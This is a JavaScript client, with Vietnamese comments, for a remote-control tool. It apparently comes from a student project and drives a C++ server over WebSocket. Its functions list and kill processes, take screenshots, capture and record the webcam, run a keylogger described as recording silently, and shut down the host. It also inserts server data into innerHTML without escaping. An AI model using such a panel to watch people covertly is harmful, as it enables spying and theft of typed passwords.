// ==========================================
// 1. KHỞI TẠO BIẾN VÀ DOM ELEMENTS
// ==========================================
let socket = null;

// Views & Status
const loginView = document.getElementById("login-view");
const controlView = document.getElementById("control-view");
const ipInput = document.getElementById("server-ip");
const portInput = document.getElementById("server-port");
const connectButton = document.getElementById("btn-connect");
const disconnectButton = document.getElementById("btn-disconnect");
const loginStatusText = document.getElementById("login-status-text");
const loginStatusLight = document.getElementById("login-status-light");
const controlStatusText = document.getElementById("control-status-text");
const controlStatusLight = document.getElementById("control-status-light");

// Modal Elements
const resultModal = document.getElementById("result-modal");
const modalTitle = document.getElementById("modal-title");
const modalBody = document.getElementById("modal-body");
const closeModal = document.getElementById("close-modal");
const modalFooter = document.getElementById("modal-footer");

// ==========================================
// 2. HỆ THỐNG TOAST (THÔNG BÁO)
// ==========================================
function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = 'toast';
    
    let icon = 'fa-info-circle';
    let color = 'var(--accent-blue)';
    
    if (type === 'success') { icon = 'fa-check-circle'; color = 'var(--accent-green)'; }
    if (type === 'error') { icon = 'fa-exclamation-triangle'; color = 'var(--accent-red)'; }
    if (type === 'warning') { icon = 'fa-bolt'; color = 'var(--accent-orange)'; }

    toast.style.borderLeftColor = color;
    toast.innerHTML = `<i class="fa-solid ${icon}" style="color:${color}"></i> <span>${message}</span>`;
    
    container.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(100%)';
        toast.style.transition = 'all 0.3s ease';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ==========================================
// 3. UI HANDLING
// ==========================================
function showControlView() {
    loginView.classList.add("hidden");
    controlView.classList.remove("hidden");
    controlStatusText.innerText = "Đã kết nối";
    controlStatusLight.className = "connected";
    showToast("Đã kết nối tới Server thành công!", "success");
}

function showLoginView(message, isError = false) {
    loginView.classList.remove("hidden");
    controlView.classList.add("hidden");
    resultModal.classList.add("hidden");
    loginStatusText.innerText = message;
    loginStatusLight.className = "disconnected";
    connectButton.disabled = false;
    connectButton.innerText = 'KẾT NỐI';
    
    if (isError) showToast(message, "error");
}

closeModal.onclick = () => { resultModal.classList.add("hidden"); };
window.onclick = (event) => { if (event.target == resultModal) resultModal.classList.add("hidden"); };

// ==========================================
// 4. WEBSOCKET LOGIC
// ==========================================
function connect() {
    const ip = ipInput.value;
    const port = portInput.value;
    if (!ip || !port) return showToast("Vui lòng nhập IP và Port.", "warning");

    connectButton.disabled = true;
    connectButton.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Đang kết nối...';
    loginStatusText.innerText = "Đang thử kết nối...";

    const serverUrl = `ws://${ip}:${port}`;
    console.log(`Connecting to: ${serverUrl}`);
    
    try { socket = new WebSocket(serverUrl); } catch (e) {
        console.error("Lỗi tạo WS:", e); showLoginView("Địa chỉ lỗi", true); return;
    }

    socket.onopen = () => { console.log("WS Connected"); showControlView(); };
    socket.onclose = () => { console.log("WS Closed"); showLoginView("Đã ngắt kết nối"); socket = null; };
    socket.onerror = (err) => { console.error("WS Error", err); showLoginView("Lỗi kết nối", true); socket = null; };
    socket.onmessage = (event) => {
        console.log(`[RECEIVED]: ${event.data}`);
        try {
            if (!event.data) return;
            const data = JSON.parse(event.data);
            handleServerResponse(data);
        } catch (e) { console.warn("Non-JSON received:", event.data); }
    };
}

function sendSocketMessage(command, payload = null) {
    if (socket && socket.readyState === WebSocket.OPEN) {
        const message = JSON.stringify({ command: command, payload: payload });
        socket.send(message);
        console.log(`[SENT]: ${message}`);
    } else {
        showToast("Mất kết nối tới server!", "error");
        showLoginView("Mất kết nối", true);
    }
}

// ==========================================
// 5. SERVER RESPONSE HANDLER
// ==========================================

function handleServerResponse(data) {
    const cmd = data.command;
    const payload = data.payload;
    const ip = ipInput.value;
    const port = portInput.value;
    const httpBaseUrl = `http://${ip}:${port}`;

    switch (cmd) {
        case "list_apps": showTableModal("Danh sách Apps", payload); break;
        case "list_processes": showTableModal("Danh sách Processes", payload); break;
        
        case "screen_capture": 
            showImageModal("Ảnh chụp màn hình", httpBaseUrl + payload); 
            break;

        case "webcam_capture":
            showImageModal("Ảnh chụp Webcam", httpBaseUrl + payload);
            break;

        case "webcam_record":
            showVideoModal("Video quay Webcam", httpBaseUrl + payload);
            break;

        case "keylogger_log":
            showLogModal("Nhật ký bàn phím (Keylogger)", payload);
            break;

        // Handle Info and Success messages from C++
        case "info": showToast(payload, "info"); break;
        case "success": showToast(payload, "success"); break;

        case "error": showModal("Lỗi từ Server", `<p style="color:var(--accent-red); font-weight:bold;">${payload}</p>`); break;
        default: console.log("Unhandled command:", data); break;
    }
}

// ==========================================
// 6. MODAL & DOWNLOAD LOGIC 
// ==========================================

function showModal(title, htmlContent) {
    modalTitle.innerText = title;
    modalBody.innerHTML = htmlContent;
    modalFooter.classList.add("hidden");
    resultModal.classList.remove("hidden");
}

function showTableModal(title, listData) {
    if (!Array.isArray(listData) || listData.length === 0) {
        showModal(title, "<p>Danh sách trống.</p>"); return;
    }
    let html = '<table class="result-table"><thead><tr>';
    const firstRow = listData[0];
    if (typeof firstRow === 'object' && firstRow !== null) {
        const headers = Object.keys(firstRow);
        headers.forEach(h => html += `<th>${h.toUpperCase()}</th>`);
        html += '</tr></thead><tbody>';
        listData.forEach(row => {
            html += '<tr>'; headers.forEach(key => html += `<td>${row[key]}</td>`); html += '</tr>';
        });
    } else {
        html += '<th>VALUE</th></tr></thead><tbody>';
        listData.forEach(row => html += `<tr><td>${row}</td></tr>`);
    }
    html += '</tbody></table>';
    showModal(title, html);
}

function showImageModal(title, url) {
    const html = `<img src="${url}" class="screenshot-img" alt="Đang tải..." onerror="this.src='';this.alt='Lỗi tải ảnh';">`;
    showModal(title, html);
    const filename = `capture_${Date.now()}.jpg`;
    setupDownloadLink(url, filename);
}

function showVideoModal(title, url) {
    const html = `<div style="text-align:center"><video controls autoplay style="max-height:60vh;max-width:100%"><source src="${url}" type="video/mp4">Trình duyệt không hỗ trợ.</video></div>`;
    showModal(title, html);
    setupDownloadLink(url, `video_${Date.now()}.mp4`);
}

// --- HÀM KEYLOGGER ---
function showLogModal(title, logContent) {
    if (!logContent) logContent = "Log trống hoặc chưa có dữ liệu.";

    // Syntax Highlighting
    let formattedHtml = logContent.replace(/\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]/g, 
        '<span class="log-timestamp">[$1]</span>');
    formattedHtml = formattedHtml.replace(/\[(?!(\d{4}))([^\]]+)\]/g, 
        '<span class="log-special">[$2]</span>');

    const html = `<div class="log-terminal" id="terminal-content">${formattedHtml}</div>`;
    showModal(title, html);
    
    // Tự động cuộn xuống cuối
    const terminal = document.getElementById("terminal-content");
    if(terminal) terminal.scrollTop = terminal.scrollHeight;

    // Tạo file text ảo để tải xuống
    const blob = new Blob([logContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    setupDownloadLink(url, `keylog_${Date.now()}.txt`);
}

// --- HÀM TẢI XUỐNG ---
function setupDownloadLink(url, filename) {
    // Luôn lấy nút hiện tại đang nằm trên DOM
    const currentBtn = document.getElementById("download-link");
    if (!currentBtn) return;

    // Clone nút để xóa sạch các event listener cũ
    const newBtn = currentBtn.cloneNode(true);
    currentBtn.parentNode.replaceChild(newBtn, currentBtn);
    
    // Cấu hình lại nút mới
    newBtn.href = "#"; 
    newBtn.innerHTML = '<i class="fa-solid fa-download"></i> Tải xuống';
    newBtn.style.display = "inline-block";

    // Gán sự kiện click
    newBtn.onclick = async (e) => {
        e.preventDefault();
        
        // CASE 1: Blob URL (Keylogger) - Tải luôn
        if (url.startsWith("blob:")) {
            triggerDownload(url, filename);
            return;
        }

        // CASE 2: HTTP URL (Ảnh/Video từ Server)
        newBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Đang tải...';
        
        try {
            const response = await fetch(url);
            if (!response.ok) throw new Error("Network error");
            
            const blob = await response.blob();
            const blobUrl = window.URL.createObjectURL(blob);
            
            triggerDownload(blobUrl, filename);
            
            window.URL.revokeObjectURL(blobUrl);
            showToast("Đã lưu file thành công!", "success");
        } catch (err) {
            console.warn("CORS Blocked or Network Error. Using fallback.");
            showToast("Server chặn tải tự động. Đang mở tab mới...", "warning");
            setTimeout(() => window.open(url, '_blank'), 1000);
        } finally {
            newBtn.innerHTML = '<i class="fa-solid fa-download"></i> Tải xuống';
        }
    };
    
    // Hiển thị Footer
    modalFooter.classList.remove("hidden");
}

function triggerDownload(url, filename) {
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

// ==========================================
// 7. EVENT LISTENERS
// ==========================================
connectButton.onclick = () => { if (!socket) connect(); };
disconnectButton.onclick = () => { if (socket) socket.close(); };

// Apps & Processes
document.getElementById("btn-list-apps").onclick = () => sendSocketMessage("list_apps");
document.getElementById("btn-start-app").onclick = () => { const n = document.getElementById("app-name-start").value; if(n) { sendSocketMessage("start_app", {name:n}); showToast(`Đang yêu cầu mở ${n}...`); } };
document.getElementById("btn-stop-app").onclick = () => { const i = document.getElementById("app-pid-stop").value; if(i) { sendSocketMessage("stop_app", {id:i}); showToast(`Đang yêu cầu đóng App ID: ${i}...`, "warning"); } };

document.getElementById("btn-list-process").onclick = () => sendSocketMessage("list_processes");
document.getElementById("btn-start-process").onclick = () => { const n = document.getElementById("process-name-start").value; if(n) sendSocketMessage("start_process", {name:n}); };
document.getElementById("btn-stop-process").onclick = () => { const i = document.getElementById("process-pid-stop").value; if(i) sendSocketMessage("stop_process", {id:i}); };

// Screen & Webcam
document.getElementById("btn-screen-capture").onclick = () => { sendSocketMessage("screen_capture"); showToast("Đang chụp màn hình..."); };
document.getElementById("btn-webcam-capture").onclick = () => { sendSocketMessage("webcam_capture"); showToast("Đang chụp webcam..."); };

document.getElementById("btn-webcam-record").onclick = () => {
    const sec = parseInt(document.getElementById("webcam-duration").value);
    if(sec > 0) {
        sendSocketMessage("webcam_record", { duration: sec });
        showToast(`Đang quay Webcam trong ${sec} giây...`, "success");
    } else { showToast("Thời gian phải > 0", "error"); }
};

// Keylogger
document.getElementById("btn-keylogger-start").onclick = () => {
    sendSocketMessage("keylogger_start");
    showToast("Keylogger đã bắt đầu ghi ngầm!", "warning");
};
document.getElementById("btn-keylogger-stop").onclick = () => {
    sendSocketMessage("keylogger_stop");
    showToast("Đang dừng và trích xuất log...", "info");
};

// Message & System
document.getElementById("btn-send-message").onclick = () => { 
    const m = document.getElementById("message-text").value; 
    if(m) { 
        sendSocketMessage("send_message", {text:m}); 
        showToast("Đã gửi thông báo!", "success");
        document.getElementById("message-text").value = "";
    } 
};

// --- RESTART BUTTON LOGIC  ---
document.getElementById("btn-restart").onclick = () => { 
    const htmlContent = document.getElementById("tpl-restart").innerHTML;
    showModal("⚠️ XÁC NHẬN RESTART", htmlContent);

    document.getElementById("btn-restart-cancel").onclick = () => {
        resultModal.classList.add("hidden");
    };

    document.getElementById("btn-restart-ok").onclick = () => {
        sendSocketMessage("restart");
        resultModal.classList.add("hidden");
        showToast("Đã gửi lệnh: Khởi động lại hệ thống!", "warning");
        setTimeout(() => {
            if(socket) socket.close();
            showLoginView("Server đang khởi động lại...", true);
        }, 2000);
    };
};

// --- SHUTDOWN LOGIC  ---
document.getElementById("btn-shutdown").onclick = () => { 
    const htmlContent = document.getElementById("tpl-shutdown").innerHTML;
    showModal("⚠️ CẢNH BÁO NGUY HIỂM", htmlContent);

    document.getElementById("btn-confirm-cancel").onclick = () => {
        resultModal.classList.add("hidden");
    };

    document.getElementById("btn-confirm-ok").onclick = () => {
        sendSocketMessage("shutdown");
        resultModal.classList.add("hidden");
        showToast("Đã gửi lệnh KHẨN CẤP: Tắt nguồn Server!", "error");
        setTimeout(() => {
            if(socket) socket.close();
            showLoginView("Server đã ngừng hoạt động.", true);
        }, 2000);
    };
};